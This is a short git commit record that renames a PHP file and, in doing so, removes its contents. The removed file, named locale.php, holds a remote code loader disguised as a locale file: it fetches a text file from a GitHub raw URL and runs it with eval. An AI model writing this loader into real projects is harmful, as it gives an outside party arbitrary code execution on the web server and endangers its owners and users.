570e6d2b3401b9d8cea3b20a014a499280fc2b4f
seobadboyz403-alt <seobadboyz403@gmail.com>
2026-09-18 13:36:58 +0700

    Update and rename locale.php to locale.phpq

--- locale.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/new-era/refs/heads/main/badboyz-edition.txt'));
-
-$content = "?> ".$content;
-eval($content);
